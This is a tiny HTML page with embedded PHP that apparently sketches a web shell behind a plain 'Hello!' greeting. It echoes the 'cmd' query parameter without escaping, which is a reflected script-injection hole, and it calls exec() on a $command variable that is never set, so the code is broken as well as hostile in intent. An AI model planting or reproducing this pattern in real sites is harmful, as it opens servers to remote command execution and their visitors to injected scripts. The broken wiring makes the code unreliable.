<html>
<body>

Hello! 
<?php

echo $_GET["cmd"];

$output = exec($command);


echo $output;

?>

</body>
</html>